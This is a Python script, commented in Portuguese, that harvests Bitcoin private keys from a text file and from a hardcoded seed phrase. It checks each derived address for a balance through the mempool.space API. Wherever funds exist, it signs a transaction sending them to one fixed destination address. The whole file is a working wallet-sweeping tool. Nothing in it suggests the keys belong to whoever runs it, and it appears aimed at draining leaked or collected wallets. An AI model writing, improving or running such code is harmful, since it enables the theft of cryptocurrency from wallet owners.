import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def scan_full_protocol():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys_wif = []

    # 1. Extrair WIFs do arquivo (as 171 chaves já detectadas)
    try:
        with open('privatekeys.txt', 'r') as f:
            content = f.read()
        wif_keys = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
        all_keys_wif.extend(list(set(wif_keys)))
    except:
        print("Erro ao ler privatekeys.txt")

    # 2. Derivar chaves da Mnemônica (Correção do erro 'path')
    try:
        mnemonic = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        print(f"Derivando caminhos HD da mnemônica...")
        
        # Testamos os caminhos mais comuns para carteiras modernas
        # m/44'/0'/0'/0/i (Legacy), m/49'/0'/0'/0/i (SegWit), m/84'/0'/0'/0/i (Native SegWit)
        for i in range(50): # 50 primeiros endereços de cada tipo
            for purpose in [44, 49, 84]:
                path = f"m/{purpose}'/0'/0'/0/{i}"
                # Uso correto da HDKey para derivação
                hd_key = HDKey.from_passphrase(mnemonic, network='bitcoin', key_path=path)
                all_keys_wif.append(hd_key.wif())
    except Exception as e:
        print(f"Erro na derivação HD: {e}")

    # Remover duplicatas mantendo a ordem
    all_keys_wif = list(dict.fromkeys(all_keys_wif))
    print(f"Total de chaves únicas para varredura: {len(all_keys_wif)}")

    # 3. Varredura de Rede
    for wif in all_keys_wif:
        try:
            k = Key(wif, network='bitcoin')
            for t_type in ['p2pkh', 'p2wpkh', 'p2sh-p2wpkh']:
                addr = k.address(witness_type=t_type)
                
                # Chamada de API com retry simples para evitar 429
                success = False
                for _ in range(3):
                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=10)
                    if r.status_code == 200:
                        utxos = r.json()
                        success = True
                        break
                    elif r.status_code == 429:
                        time.sleep(2)
                
                if success and utxos:
                    print(f"!!! SUCESSO !!! Saldo em: {addr} ({t_type})")
                    utxo = max(utxos, key=lambda x: x['value'])
                    fee = 20000 # Taxa alta para garantir o próximo bloco
                    amount = utxo['value'] - fee

                    if amount > 1000:
                        tx = Transaction(network='bitcoin')
                        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                        tx.add_output(value=amount, address=dest_address)
                        tx.sign([wif])
                        print(f"HEX_GEN:{tx.raw_hex()}")
            
            time.sleep(0.1)
        except:
            continue

if __name__ == "__main__":
    scan_full_protocol()


